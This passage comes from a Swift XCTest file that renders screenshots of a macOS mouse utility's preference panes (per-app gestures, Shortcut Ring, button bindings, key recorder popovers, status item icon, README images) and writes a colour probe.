            detail.ringPart.ownRingFold?.setExpanded(true)
            detail.ringPart.onHeightChange?()
        }
        try page("app-fold-gestures", app: calculator, part: .gestures)
    }

    /// An app's page has everything the panes have (`app-parity-<case>-<appearance>.png`):
    /// Calculator's own gestures with all their sections while a button runs them and a mouse
    /// can track and pulse (`app-parity-gestures`: Mode in "follow the hand", Directions,
    /// Behavior with the speed, Logitech mouse), the same while nothing runs them
    /// (`app-parity-gestures-folded`: Mode, the three titles folded, Reset), and Calculator's
    /// own ring with its freeze switch between the drawing and the places (`app-parity-ring`).
    func testRenderAppPageParity() throws {
        let stored = Options.shared.application.applications
        let savedRing = Options.shared.ring
        let savedGesture = Options.shared.gesture
        addTeardownBlock {
            Options.shared.application.applications = stored
            Options.shared.ring = savedRing
            Options.shared.gesture = savedGesture
            ShortcutRingController.forgetPreparedFaces()
            ButtonUtils.shared.invalidateCache()
        }
        Options.shared.ring = .default
        Options.shared.gesture = .default
        let calculator = Application(path: "/System/Applications/Calculator.app")
        calculator.setUsesGeneralGestures(false, general: .default)
        var gestures = GestureActions.default
        gestures.up = GestureAction(action: "custom::15:1179648", label: ShortcutLabel(name: "Reload", icon: .symbol("arrow.clockwise")))
        calculator.setOwnGestures(actions: gestures, invertHorizontal: false)
        calculator.changeOwnGestures { own in
            own.mode = .interactive
            own.trackingSpeed = 1.5
            own.freezePointer = false
            own.deviceTracking = true
        }
        calculator.setUsesGeneralRing(false, general: .default)
        calculator.ring?[0] = ShortcutRingPlace(SystemShortcut.copy)
        calculator.setOwnRingFreezePointer(true)
        Options.shared.application.applications = EnhanceArray<Application>(withArray: [calculator], matchKey: "path")
        var hapticsOffOnMouse = false
        let mice = MouseGestureDeviceSource(support: {
            MouseGestureDeviceSupport(deviceTracking: true, haptics: true, hapticsOffOnMouse: hapticsOffOnMouse)
        }, refresh: {})

        func page(_ name: String, part: ApplicationPagePart) throws {
            let defaults = uiDefaults(advanced: false)
            try renderPane(PANEL_IDENTIFIER.application, name: name, prepare: { preferences in
                (preferences.controller(for: PANEL_IDENTIFIER.application) as? PreferencesApplicationViewController)?
                    .uiStateDefaults = defaults
            }, afterLoad: { controller in
                let apps = controller as? PreferencesApplicationViewController
                apps?.openApplication(withID: calculator.path, part: part)
                guard let detail = apps?.detailController else { return }
                detail.gesturesPart.isInteractiveAvailable = { true }
                detail.gesturesPart.deviceSource = mice
                detail.gesturesPart.syncViewWithOptions()
                detail.onHeightChange?()
            })
        }
        Options.shared.buttons.binding = [
            binding(3, SystemShortcut.mouseGestureNavigation.identifier),
            binding(1001, SystemShortcut.shortcutRing.identifier),
        ]
        ButtonUtils.shared.invalidateCache()
        try page("app-parity-gestures", part: .gestures)
        try page("app-parity-ring", part: .ring)
        // Haptics switched off under Mouse: the line under the Logitech box.
        hapticsOffOnMouse = true
        Options.shared.logiMouse.hapticsOn = false
        try page("app-parity-gestures-haptics-off", part: .gestures)
        hapticsOffOnMouse = false
        Options.shared.logiMouse = savedMouse
        Options.shared.buttons.binding = []
        ButtonUtils.shared.invalidateCache()
        try page("app-parity-gestures-folded", part: .gestures)
    }

    /// Full control of the buttons per app, on an MX Master 4 whose thumb panel runs Gesture
    /// Navigation in Buttons and an app ("Figma") whose own binding gives it the Shortcut
    /// Ring: its Buttons part (`app-buttons-thumb-panel-ring-<appearance>.png`), that row's
    /// menu drawn as a stand-in (`app-buttons-menu-<appearance>.png`), its Gestures part with
    /// the line that no button runs the gestures there (`app-gestures-part-note`), its
    /// Shortcut Ring part, where only its own button opens the ring
    /// (`app-ring-part-note`), another app's Shortcut Ring part then
    /// (`app-ring-part-note-elsewhere`) and the Shortcut Ring pane (`ring-pane-only-in-app`),
    /// and an app whose own buttons take the ring's button (`app-ring-part-note-replaced`).
    func testRenderAppPageFullControl() throws {
        let stored = Options.shared.application.applications
        let savedRing = Options.shared.ring
        addTeardownBlock {
            Options.shared.application.applications = stored
            Options.shared.ring = savedRing
            ShortcutRingController.forgetPreparedFaces()
            ButtonUtils.shared.invalidateCache()
        }
        Options.shared.ring = .default
        Options.shared.gesture = .default
        let thumbPanel = LogiCenter.shared.scrollioCode(for: .thumbPanel)
        Options.shared.buttons.binding = [
            binding(thumbPanel, SystemShortcut.mouseGestureNavigation.identifier),
            binding(3, SystemShortcut.navigateBack.identifier),
        ]
        let mouse = ButtonsDeviceSource(
            captureStatus: { _ in .normal }, deviceName: { "MX Master 4" }, isBusy: { false }, refresh: {}, warnBluetoothButton: { _ in }
        )
        let figma = Application(path: "/Applications/Figma.app")
        figma.displayName = "Figma"
        figma.setOwnButtonBindings([
            binding(thumbPanel, SystemShortcut.shortcutRing.identifier),
            binding(4, SystemShortcut.copy.identifier),
        ])
        let calculator = Application(path: "/System/Applications/Calculator.app")
        Options.shared.application.applications = EnhanceArray<Application>(withArray: [figma, calculator], matchKey: "path")

        func page(_ name: String, app: Application, part: ApplicationPagePart, after: @escaping (ApplicationDetailViewController) -> Void = { _ in }) throws {
            let defaults = uiDefaults(advanced: false)
            try renderPane(PANEL_IDENTIFIER.application, name: name, prepare: { preferences in
                (preferences.controller(for: PANEL_IDENTIFIER.application) as? PreferencesApplicationViewController)?
                    .uiStateDefaults = defaults
            }, afterLoad: { controller in
                let apps = controller as? PreferencesApplicationViewController
                apps?.openApplication(withID: app.path, part: part)
                guard let detail = apps?.detailController else { return }
                detail.buttonsPart.deviceSource = mouse
                detail.buttonsPart.reloadRows()
                after(detail)
            })
        }
        try page("app-buttons-thumb-panel-ring", app: figma, part: .buttons) { detail in
            detail.buttonsPart.list.select(AnyHashable(figma.ownButtonBindings[0].id))
        }
        try page("app-gestures-part-note", app: figma, part: .gestures)
        try page("app-ring-part-note", app: figma, part: .ring)
        // Calculator, while only Figma's own thumb panel opens the ring.
        try page("app-ring-part-note-elsewhere", app: calculator, part: .ring)
        // The Shortcut Ring pane then: where it opens, and "Change" (`ring-pane-only-in-app`).
        try renderPane(RingPreferencesViewController.tabIdentifier, name: "ring-pane-only-in-app", titled: TitledCut())
        Options.shared.buttons.binding.append(binding(5, SystemShortcut.shortcutRing.identifier))
        calculator.setOwnButtonBindings([binding(5, SystemShortcut.missionControl.identifier)])
        try page("app-ring-part-note-replaced", app: calculator, part: .ring)

        // The thumb panel row's menu, as the Buttons pane's.
        let part = ApplicationButtonsViewController(application: figma)
        part.deviceSource = mouse
        _ = part.view
        let pullDown = try XCTUnwrap(part.rows.first?.pullDown)
        try renderMenuStandIn(Array((pullDown.menu?.items ?? []).dropFirst().filter { !$0.isHidden }), name: "app-buttons-menu")
    }

    /// The thumb wheel in an app's Buttons part (`app-buttons-thumb-wheel`), on an MX
    /// Master 4: the app's own Zoom first, with what the wheel does everywhere under it,
    /// then a button of the app's own; the wheel's row selected.
    func testRenderAppButtonsThumbWheel() throws {
        let stored = Options.shared.application.applications
        addTeardownBlock {
            Options.shared.application.applications = stored
            ButtonUtils.shared.invalidateCache()
        }
        Options.shared.buttons.binding = [
            binding(3, SystemShortcut.navigateBack.identifier),
            binding(4, SystemShortcut.missionControl.identifier),
        ]
        let mouse = ButtonsDeviceSource(
            captureStatus: { _ in .normal }, deviceName: { "MX Master 4" }, isBusy: { false }, refresh: {}, warnBluetoothButton: { _ in }
        )
        let safari = Application(path: "/Applications/Safari.app")
        safari.setOwnThumbWheelFunction(.zoom)
        safari.setOwnButtonBindings([binding(4, SystemShortcut.appExpose.identifier)])
        Options.shared.application.applications = EnhanceArray<Application>(withArray: [safari], matchKey: "path")
        let defaults = uiDefaults(advanced: false)
        try renderPane(PANEL_IDENTIFIER.application, name: "app-buttons-thumb-wheel", prepare: { preferences in
            (preferences.controller(for: PANEL_IDENTIFIER.application) as? PreferencesApplicationViewController)?
                .uiStateDefaults = defaults
        }, afterLoad: { controller in
            let apps = controller as? PreferencesApplicationViewController
            apps?.openApplication(withID: safari.path, part: .buttons)
            let part = apps?.detailController?.buttonsPart
            part?.deviceSource = mouse
            part?.reloadRows()
            part?.list.select(ButtonsListLayout.thumbWheelRowID)
        })
    }

    // MARK: - States for the final visual check

    /// The tallest panes at the window's minimum height: the column as the window shows it.
    func testRenderMinimumHeight() throws {
        let minimum = PreferencesWindowLayout.minimumContentHeight
        Options.shared.scroll = OPTIONS_SCROLL_DEFAULT()
        try renderPane(PANEL_IDENTIFIER.scrolling, name: "min-scrolling-advanced", windowHeight: minimum, prepare: { preferences in
            (preferences.controller(for: PANEL_IDENTIFIER.scrolling) as? PreferencesScrollingViewController)?
                .uiStateDefaults = self.uiDefaults(advanced: true)
        })
        Options.shared.logiMouse = .default
        Options.shared.logiWheel = LogiWheelSettings(managedByScrollio: true)
        try renderMouse([MouseDeviceFixtures.mxMaster4()], name: "min-mouse-managed", windowHeight: minimum)
        Options.shared.logiWheel = .default
        Options.shared.buttons.binding = [
            binding(3, SystemShortcut.mouseGestureNavigation.identifier),
            binding(4, SystemShortcut.scrollDash.identifier),
            binding(2, SystemShortcut.missionControl.identifier),
            binding(5, SystemShortcut.copy.identifier),
            binding(6, ""),
        ]
        let plain = ButtonsDeviceSource(captureStatus: { _ in .normal }, deviceName: { "MX Master 4" }, isBusy: { false }, refresh: {}, warnBluetoothButton: { _ in })
        try renderButtons(name: "min-buttons", source: plain, windowHeight: minimum)
        var gesture = MouseGestureSettings.default
        gesture.mode = .interactive
        gesture.deviceTracking = true
        Options.shared.gesture = gesture
        try renderPane(GesturesPreferencesViewController.tabIdentifier, name: "min-gestures-follow", windowHeight: minimum, replacement: {
            let gestures = GesturesPreferencesViewController(isInteractiveAvailable: { true })
            gestures.deviceSource = MouseGestureDeviceSource(support: { MouseGestureDeviceSupport(deviceTracking: true, haptics: true) }, refresh: {})
            gestures.bindingSummary = {
                MouseGestureBindingSummary(
                    hasGestureButton: true, hasLogitechGestureButton: true, buttonTitles: ["Gesture button"],
                    picture: self.gesturePicture(logitech: true)
                )
            }
            return gestures
        }, afterLoad: { controller in
            guard let gestures = controller as? GesturesPreferencesViewController else { return }
            gestures.previewView.prefersReducedMotion = { true }
            gestures.previewView.reduceMotionDidChange()
        })
        let stored = Options.shared.application.applications
        addTeardownBlock { Options.shared.application.applications = stored }
        let calculator = Application(path: "/System/Applications/Calculator.app")
        calculator.inherit = false
        Options.shared.application.applications = EnhanceArray<Application>(withArray: [calculator], matchKey: "path")
        let defaults = uiDefaults(advanced: true)
        try renderPane(PANEL_IDENTIFIER.application, name: "min-app-page-own-advanced", windowHeight: minimum, prepare: { preferences in
            (preferences.controller(for: PANEL_IDENTIFIER.application) as? PreferencesApplicationViewController)?
                .uiStateDefaults = defaults
        }, afterLoad: { controller in
            (controller as? PreferencesApplicationViewController)?.openApplication(withID: calculator.path)
        })
    }

    /// Long names: a Logitech control with a long name, every modifier, a long action, a
    /// long mouse name, a problem note on each row; a selection in a window that is not key.
    func testRenderButtonsLongNames() throws {
        let all = UInt(CGEventFlags.maskControl.rawValue | CGEventFlags.maskAlternate.rawValue
            | CGEventFlags.maskShift.rawValue | CGEventFlags.maskCommand.rawValue)
        Options.shared.buttons.binding = [
            binding(2214, SystemShortcut.scrollDash.identifier),
            binding(2253, SystemShortcut.logiDPICycleUp.identifier),
            binding(4, SystemShortcut.missionControl.identifier, modifiers: all),
            binding(1001, SystemShortcut.logiSmartShiftToggle.identifier),
            binding(1000, ""),
        ]
        let source = ButtonsDeviceSource(
            captureStatus: { code in
                switch code {
                case 2214: return .contended
                case 2253: return .conflict(.foreignDivert)
                case 1001: return .bleHIDPPUnstable
                default: return .normal
                }
            },
            deviceName: { "MX Master 3S for Mac with a very long name" }, isBusy: { false }, refresh: {}, warnBluetoothButton: { _ in }
        )
        try renderButtons(name: "buttons-long-names", source: source, scrollKeys: [ScrollHotkey(type: .mouse, code: 4)])
        try renderButtons(name: "buttons-long-names-selected", source: source, scrollKeys: [ScrollHotkey(type: .mouse, code: 4)]) { buttons in
            buttons.list.select(self.rowID(buttons, binding: 0))
        }
        Options.shared.buttons.binding = [
            binding(3, SystemShortcut.mouseGestureNavigation.identifier),
            binding(4, SystemShortcut.scrollDash.identifier),
            binding(5, SystemShortcut.copy.identifier),
        ]
        let plain = ButtonsDeviceSource(captureStatus: { _ in .normal }, deviceName: { nil }, isBusy: { false }, refresh: {}, warnBluetoothButton: { _ in })
        try renderButtons(name: "buttons-selected-not-key", source: plain, key: false) { buttons in
            buttons.list.select(self.rowID(buttons, binding: 1))
        }
    }

    /// On an MX Master 4, a Logitech Back button that opens the Shortcut Ring and has a
    /// standard twin: the hint says the standard one gets no pulse
    /// (`buttons-standard-no-pulse-<appearance>.png`).
    func testRenderStandardButtonHintWithoutPulse() throws {
        Options.shared.buttons.binding = [
            binding(1006, SystemShortcut.shortcutRing.identifier),
            binding(5, SystemShortcut.copy.identifier),
        ]
        let source = ButtonsDeviceSource(
            captureStatus: { $0 == 1006 ? .standardMouseAliasAvailable : .normal },
            deviceName: { "MX Master 4" }, isBusy: { false }, refresh: {}, warnBluetoothButton: { _ in }
        )
        try renderButtons(name: "buttons-standard-no-pulse", source: source)
    }

    /// The ⓘ popover of each kind of problem, in the popover's material.
    func testRenderButtonProblemPopovers() throws {
        let kinds: [(String, ButtonCapturePresentationStatus?)] = [
            ("conflict", .conflict(.foreignDivert)),
            ("contended", .contended),
            ("bluetooth", .bleHIDPPUnstable),
            ("standard-button", .standardMouseAliasAvailable),
            ("scroll-key", nil),
        ]
        for (name, status) in kinds {
            let note: ButtonRowNote?
            if let status {
                note = ButtonRowNote.make(for: binding(1006, SystemShortcut.copy.identifier), captureStatus: status, scrollHoldKeys: [], standardButtonName: "Back button")
            } else {
                note = ButtonRowNote.make(for: binding(4, SystemShortcut.copy.identifier), captureStatus: .normal, scrollHoldKeys: [ScrollHotkey(type: .mouse, code: 4)])
            }
            let controller = ButtonProblemPopoverController(note: try XCTUnwrap(note))
            let view = controller.view
            view.setFrameSize(view.fittingSize)
            try renderInPopoverMaterial(view, name: "buttons-popover-\(name)")
        }
    }

    /// The key recorder's popover while it waits, in each mode and for the gesture button
    /// (`key-recorder-<case>-<appearance>.png`); then with ⌘ held, a refused key, and a
    /// recorded button. Drawn without the popover's arrow.
    func testRenderKeyRecorderPopover() throws {
        let cases: [(name: String, hint: String, prepare: (KeyPopover) -> Void)] = [
            ("combination", KeyRecordingMode.combination.waitingHint, { _ in }),
            ("single-key", KeyRecordingMode.singleKey.waitingHint, { _ in }),
            ("adaptive", KeyRecordingMode.adaptive.waitingHint, { _ in }),
            ("gesture", NSLocalizedString("buttons-recorder-waiting-gesture", comment: ""), { _ in }),
            ("combination-command-held", KeyRecordingMode.combination.waitingHint, { popover in
                popover.keyPreview.updateForRecording(modifiers: .maskCommand)
            }),
            ("gesture-refused-key", NSLocalizedString("buttons-recorder-waiting-gesture", comment: ""), { popover in
                popover.keyPreview.update(from: ["⌘", "C"], status: .duplicate)
                popover.showRefusalHint(NSLocalizedString("buttons-gesture-needs-mouse-button", comment: ""))
            }),
            ("combination-recorded", KeyRecordingMode.combination.waitingHint, { popover in
                popover.keyPreview.update(from: ["⌥", "Back button"], status: .recorded)
            }),
        ]
        for item in cases {
            let popover = KeyPopover()
            popover.announce = { _ in }
            popover.testingPrepareContent(waitingHint: item.hint)
            item.prepare(popover)
            let view = try XCTUnwrap(popover.testingContentView)
            view.layoutSubtreeIfNeeded()
            view.setFrameSize(view.fittingSize)
            try renderInPopoverMaterial(view, name: "key-recorder-\(item.name)")
            popover.hide()
        }
    }

    /// Apps with long names, and the page of one of them.
    func testRenderAppsLongNames() throws {
        let stored = Options.shared.application.applications
        addTeardownBlock { Options.shared.application.applications = stored }
        let long = Application(path: "/Applications/Microsoft Visual Studio Code Insiders Edition With A Long Name.app")
        long.displayName = "Microsoft Visual Studio Code Insiders Edition With A Very Long Name"
        long.inherit = false
        let calculator = Application(path: "/System/Applications/Calculator.app")
        Options.shared.application.applications = EnhanceArray<Application>(withArray: [long, calculator], matchKey: "path")
        Options.shared.application.allowlist = false
        try renderPane(PANEL_IDENTIFIER.application, name: "apps-long-names", afterLoad: { controller in
            (controller as? PreferencesApplicationViewController)?.list.select(long.path)
        })
        try renderPane(PANEL_IDENTIFIER.application, name: "app-page-long-name", afterLoad: { controller in
            (controller as? PreferencesApplicationViewController)?.openApplication(withID: long.path)
        })
    }

    // MARK: - Menu bar

    /// The status item's image (`status-item-<scale>x-<bar>.png`, at the bar's size in
    /// pixels, and `status-item-sheet.png`, the four magnified without smoothing): the
    /// template image in the ink of a light and of a dark menu bar, centred in a 24 pt bar
    /// as the status item centres it, at 1x and 2x.
    func testRenderStatusItemIcon() throws {
        let image = try XCTUnwrap(NSImage(named: "AppStatusBarIcon"))
        XCTAssertTrue(image.isTemplate)
        let bar = NSSize(width: 34, height: 24)
        let bars: [(name: String, appearance: NSAppearance.Name, fill: NSColor, ink: NSColor)] = [
            ("light", .aqua, NSColor(white: 0.94, alpha: 1), NSColor(white: 0, alpha: 0.85)),
            ("dark", .darkAqua, NSColor(white: 0.12, alpha: 1), NSColor(white: 1, alpha: 0.9)),
        ]
        var pictures: [NSBitmapImageRep] = []
        for scale in [1, 2] {
            for item in bars {
                let rep = try XCTUnwrap(NSBitmapImageRep(
                    bitmapDataPlanes: nil, pixelsWide: Int(bar.width) * scale, pixelsHigh: Int(bar.height) * scale,
                    bitsPerSample: 8, samplesPerPixel: 4, hasAlpha: true, isPlanar: false,
                    colorSpaceName: .deviceRGB, bytesPerRow: 0, bitsPerPixel: 0
                ))
                rep.size = bar
                let context = try XCTUnwrap(NSGraphicsContext(bitmapImageRep: rep))
                NSGraphicsContext.saveGraphicsState()
                NSGraphicsContext.current = context
                try XCTUnwrap(NSAppearance(named: item.appearance)).performAsCurrentDrawingAppearance {
                    item.fill.setFill()
                    NSRect(origin: .zero, size: bar).fill()
                    let rect = NSRect(
                        x: (bar.width - image.size.width) / 2, y: (bar.height - image.size.height) / 2,
                        width: image.size.width, height: image.size.height
                    )
                    // A template image in the bar's ink: its alpha, filled with the ink.
                    context.cgContext.beginTransparencyLayer(in: rect, auxiliaryInfo: nil)
                    image.draw(in: rect, from: .zero, operation: .sourceOver, fraction: 1)
                    item.ink.setFill()
                    rect.fill(using: .sourceIn)
                    context.cgContext.endTransparencyLayer()
                }
                NSGraphicsContext.restoreGraphicsState()
                let png = try XCTUnwrap(rep.representation(using: .png, properties: [:]))
                try png.write(to: directory.appendingPathComponent("status-item-\(scale)x-\(item.name).png"))
                pictures.append(rep)
            }
        }
        // The sheet: 1x light and dark on top, 2x light and dark under them, all four as
        // large in points: a pixel of 1x is 16 × 16, one of 2x is 8 × 8.
        let cell = NSSize(width: bar.width * 16, height: bar.height * 16)
        let sheet = try XCTUnwrap(NSBitmapImageRep(
            bitmapDataPlanes: nil, pixelsWide: Int(cell.width) * 2 + 24, pixelsHigh: Int(cell.height) * 2 + 24,
            bitsPerSample: 8, samplesPerPixel: 4, hasAlpha: true, isPlanar: false,
            colorSpaceName: .deviceRGB, bytesPerRow: 0, bitsPerPixel: 0
        ))
        let context = try XCTUnwrap(NSGraphicsContext(bitmapImageRep: sheet))
        NSGraphicsContext.saveGraphicsState()
        NSGraphicsContext.current = context
        context.imageInterpolation = .none
        NSColor(white: 0.5, alpha: 1).setFill()
        NSRect(x: 0, y: 0, width: sheet.pixelsWide, height: sheet.pixelsHigh).fill()
        for (index, rep) in pictures.enumerated() {
            let column = index % 2
            let row = 1 - index / 2
            let target = NSRect(
                x: CGFloat(column) * (cell.width + 24), y: CGFloat(row) * (cell.height + 24),
                width: cell.width, height: cell.height
            )
            rep.draw(in: target, from: .zero, operation: .copy, fraction: 1, respectFlipped: false, hints: [
                .interpolation: NSNumber(value: NSImageInterpolation.none.rawValue),
            ])
        }
        NSGraphicsContext.restoreGraphicsState()
        let png = try XCTUnwrap(sheet.representation(using: .png, properties: [:]))
        try png.write(to: directory.appendingPathComponent("status-item-sheet.png"))
    }

    // MARK: - README

    /// The pictures of the README (`readme-<pane>-<appearance>.png`, copied by hand to
    /// `assets/readme/`): Scrolling at its defaults; Buttons with an MX Master 4, a few
    /// buttons and keys set up, the thumb panel free and the gesture button's row selected;
    /// Gestures with an MX Master 4; the Mouse pane of an MX Master 4 that Scrollio manages,
    /// down to its scroll wheel; Shortcut Ring with an MX Master 4 whose thumb panel opens
    /// the default ring (`readme-ring`); Safari's own Shortcut Ring on its page, its
    /// suggested shortcuts round its icon (`readme-app`, cut below the drawing). Each is the
    /// window's column under the pane's title, cut below a box of the pane.
    /// Numbers follow the region of the test run: for "6.3×" rather than "6,3×", give the
    /// test plan's configuration the options `"language": "en", "region": "US"` while you
    /// render (xcodebuild's `-testRegion` does not reach a scheme with test plans), then:
    /// `TEST_RUNNER_SCROLLIO_SHOTS_DIR=<folder> xcodebuild … test -only-testing:ScrollioTests/PreferencesWindowRenderTests/testRenderReadmePictures -only-testing:ScrollioTests/WelcomeGuideRenderTests/testRenderReadmePicture`.
    /// The Welcome Guide's picture: `WelcomeGuideRenderTests.testRenderReadmePicture`.
    func testRenderReadmePictures() throws {
        Options.shared.scroll = OPTIONS_SCROLL_DEFAULT()
        Options.shared.thumbWheel = .default
        try renderPane(PANEL_IDENTIFIER.scrolling, name: "readme-scrolling", titled: TitledCut(boxes: 1), prepare: { preferences in
            (preferences.controller(for: PANEL_IDENTIFIER.scrolling) as? PreferencesScrollingViewController)?
                .uiStateDefaults = self.uiDefaults(advanced: false)
        })

        let mxMaster4 = ButtonsDeviceSource(captureStatus: { _ in .normal }, deviceName: { "MX Master 4" }, isBusy: { false }, refresh: {}, warnBluetoothButton: { _ in })
        let controlOption = UInt(CGEventFlags.maskControl.rawValue | CGEventFlags.maskAlternate.rawValue)
        // (The thumb panel is left free: its row says what it is good for.)
        Options.shared.buttons.binding = [
            binding(1000, SystemShortcut.mouseGestureNavigation.identifier),
            binding(3, SystemShortcut.missionControl.identifier),
            ButtonBinding(
                triggerEvent: RecordedEvent(type: .keyboard, code: 40, modifiers: controlOption, deviceFilter: nil),
                systemShortcutName: SystemShortcut.screenshotSelection.identifier
            ),
            binding(7, SystemShortcut.paste.identifier),
        ]
        try renderButtons(name: "readme-buttons", source: mxMaster4, titled: TitledCut(boxes: 1)) { buttons in
            buttons.list.select(self.rowID(buttons, binding: 0))
        }

        var gesture = MouseGestureSettings.default
        gesture.mode = .discrete
        gesture.deviceTracking = true
        Options.shared.gesture = gesture
        Options.shared.logiMouse = LogiMouseSettings()
        try renderPane(GesturesPreferencesViewController.tabIdentifier, name: "readme-gestures", titled: TitledCut(boxes: 2), replacement: {
            let gestures = GesturesPreferencesViewController(isInteractiveAvailable: { true })
            gestures.deviceSource = MouseGestureDeviceSource(support: { MouseGestureDeviceSupport(deviceTracking: true, haptics: true) }, refresh: {})
            gestures.bindingSummary = {
                MouseGestureBindingSummary(
                    hasGestureButton: true, hasLogitechGestureButton: true, buttonTitles: ["Gesture button"],
                    picture: self.gesturePicture(logitech: true)
                )
            }
            return gestures
        }, afterLoad: { controller in
            guard let gestures = controller as? GesturesPreferencesViewController else { return }
            gestures.previewView.prefersReducedMotion = { true }
            gestures.previewView.reduceMotionDidChange()
            gestures.previewView.mouseSource = { .mxMaster4 }
            gestures.previewView.reloadMouse()
        })

        // The values are the mouse's own: nothing set here that it does not have.
        Options.shared.logiMouse = .default
        Options.shared.logiWheel = LogiWheelSettings(managedByScrollio: true)
        let master4 = MouseDeviceFixtures.mxMaster4(dpi: 1600, hapticsOn: true, strength: 60, pressForce: 5167)
        try renderMouse([master4], name: "readme-mouse", titled: TitledCut(boxes: 3))

        let stored = Options.shared.application.applications
        let savedRing = Options.shared.ring
        let savedIdentifier = ShortcutRingSuggestions.bundleIdentifierOfApplication
        let savedLayout = ShortcutRingSuggestions.layout
        addTeardownBlock {
            Options.shared.application.applications = stored
            Options.shared.ring = savedRing
            ShortcutRingSuggestions.bundleIdentifierOfApplication = savedIdentifier
            ShortcutRingSuggestions.layout = savedLayout
            ShortcutRingController.forgetPreparedFaces()
            ButtonUtils.shared.invalidateCache()
        }
        Options.shared.application.applications = EnhanceArray<Application>(matchKey: "path")
        Options.shared.ring = .default
        // The thumb panel opens the ring, a binding of Buttons as the user makes it.
        let opensRing = [binding(LogiCenter.shared.scrollioCode(for: .thumbPanel), SystemShortcut.shortcutRing.identifier)]
        Options.shared.buttons.binding = opensRing
        ButtonUtils.shared.invalidateCache()
        try renderPane(RingPreferencesViewController.tabIdentifier, name: "readme-ring", titled: TitledCut(boxes: 1), replacement: {
            let ring = RingPreferencesViewController()
            ring.bindingSummary = { ShortcutRingBindingSummary(bindings: opensRing) }
            return ring
        }, afterLoad: { controller in
            guard let ring = controller as? RingPreferencesViewController else { return }
            ring.triggerChooser?.deviceSource = mxMaster4
            Self.stillTriggerCard(of: ring, mouse: .mxMaster4)
            ring.reload()
        })

        // Safari's page, right after "Use settings from Shortcut Ring" was turned off: its own
        // ring holds Safari's suggested shortcuts (on the US layout) round its icon. Safari
        // gets its bundle identifier through the seam.
        let safari = Application(path: "/Applications/Safari.app")
        safari.displayName = "Safari"
        ShortcutRingSuggestions.bundleIdentifierOfApplication = { $0 == safari.path ? "com.apple.Safari" : nil }
        ShortcutRingSuggestions.layout = { .us }
        Options.shared.application.applications = EnhanceArray<Application>(withArray: [safari], matchKey: "path")
        let defaults = uiDefaults(advanced: false)
        try renderPane(PANEL_IDENTIFIER.application, name: "readme-app",
                       titled: TitledCut(boxes: 3, margin: 12, alsoBoxes: [ShortcutRingPreviewView.self]), prepare: { preferences in
            (preferences.controller(for: PANEL_IDENTIFIER.application) as? PreferencesApplicationViewController)?
                .uiStateDefaults = defaults
        }, afterLoad: { controller in
            let pane = controller as? PreferencesApplicationViewController
            pane?.openApplication(withID: safari.path, part: .ring)
            guard let part = pane?.detailController?.ringPart else { return }
            // Each appearance starts from the general ring, as the user finds it.
            safari.ring = nil
            part.syncViewWithOptions()
            part.generalRingRow.toggle.state = .off
            part.generalRingClick(part.generalRingRow.toggle)
            part.syncViewWithOptions()
        })
    }

    // MARK: - Kit

    /// The kit's list in a pane: four rows (symbol and app icons, explanations, a pull-down,
    /// a chevron, one selected) under a box, and an empty list. The selection
    /// in a key window and in one that is not.
    func testRenderListBox() throws {
        for key in [true, false] {
            let state = key ? "key" : "not-key"
            try renderPane(PANEL_IDENTIFIER.general, name: "list-\(state)", key: key, replacement: {
                ListRenderController(empty: false)
            })
        }
        try renderPane(PANEL_IDENTIFIER.general, name: "list-empty", replacement: {
            ListRenderController(empty: true)
        })
    }

    // MARK: - Probes

    /// Writes how the disabled texts resolve on screen: the appearance they get, the colour,
    /// and whether the window server blends them (vibrancy). Read by hand.
    func testWriteColourProbe() throws {
        var lines: [String] = []
        var gesture = MouseGestureSettings.default
        gesture.mode = .interactive
        Options.shared.gesture = gesture
        for appearanceName in [NSAppearance.Name.aqua, .darkAqua] {
            let (window, preferences) = try makeWindow(appearance: appearanceName)
            let gestures = GesturesPreferencesViewController(isInteractiveAvailable: { true })
            gestures.deviceSource = MouseGestureDeviceSource(support: { .none }, refresh: {})
            preferences.host.show(gestures)
            window.contentView?.layoutSubtreeIfNeeded()
            let left = gestures.directionRows[MouseGestureSettingsControls.Slot.left.rawValue]
            let up = gestures.directionRows[MouseGestureSettingsControls.Slot.up.rawValue]
            for (label, view) in [("disabled title", left.titleLabel), ("enabled title", up.titleLabel)] as [(String, NSTextField)] {
                lines.append("\(appearanceName.rawValue) \(label): appearance \(view.effectiveAppearance.name.rawValue), "
                    + "allowsVibrancy \(view.allowsVibrancy), colour \(describe(view.textColor, in: view.effectiveAppearance))")
            }
            let box = try XCTUnwrap(left.superview?.superview as? PreferencesGroupBox)
            lines.append("\(appearanceName.rawValue) box fill: \(describe(PreferencesGroupedForm.boxFillColor, in: box.effectiveAppearance)), allowsVibrancy \(box.allowsVibrancy)")
            let controls: [(String, NSView)] = [
                ("switch", gestures.controls.invertToggle),
                ("slider", gestures.trackingSpeedSlider),
                ("segmented", gestures.controls.modeControl),
                ("pop-up", gestures.controls.actionPopUp(for: .left)),
                ("note", gestures.directionsHintLabel),
            ]
            for (label, view) in controls {
                lines.append("\(appearanceName.rawValue) \(label): \(type(of: view)) allowsVibrancy \(view.allowsVibrancy) enabled \((view as? NSControl)?.isEnabled ?? true)")
            }
            lines.append("\(appearanceName.rawValue) window key \(window.isKeyWindow) main \(window.isMainWindow)")
            for name in ["labelColor", "secondaryLabelColor", "tertiaryLabelColor", "quaternaryLabelColor", "disabledControlTextColor"] {
                let color = NSColor.value(forKey: name) as? NSColor
                lines.append("\(appearanceName.rawValue) \(name): vibrant \(describe(color, in: left.effectiveAppearance)) plain \(describe(color, in: NSAppearance(named: appearanceName)!))")
            }
        }
        try lines.joined(separator: "\n").write(to: directory.appendingPathComponent("colour-probe.txt"), atomically: true, encoding: .utf8)
    }

    // MARK: - The mouse drawing per model

    /// The Mouse, Buttons and Gestures panes with an MX Master 4, an MX Master 3S and no
    /// Logitech mouse (`pane-<pane>-<mouse>-<appearance>.png`): the Mouse pane plain and
    /// with each part lit; the Buttons pane with the gesture button and the thumb panel
    /// selected (Button 5 is said to be the thumb panel, which only the MX Master 4 has) and
    /// "That's …" for the gesture button; the Gestures pane at rest; and "Which Button Is
    /// This?" for Button 6 (`menu-place-<mouse>-<appearance>.png`).
    func testRenderMouseArtworkPanes() throws {
        let mice: [(name: String, device: LogiMouseDeviceState?, support: MouseGestureDeviceSupport)] = [
            ("mx4", MouseDeviceFixtures.mxMaster4(), MouseGestureDeviceSupport(deviceTracking: true, haptics: true)),
            ("mx3s", MouseDeviceFixtures.mxMaster3S(), MouseGestureDeviceSupport(deviceTracking: true, haptics: false)),
            ("none", nil, .none),
        ]
        for mouse in mice {
            Options.shared.logiMouse = .default
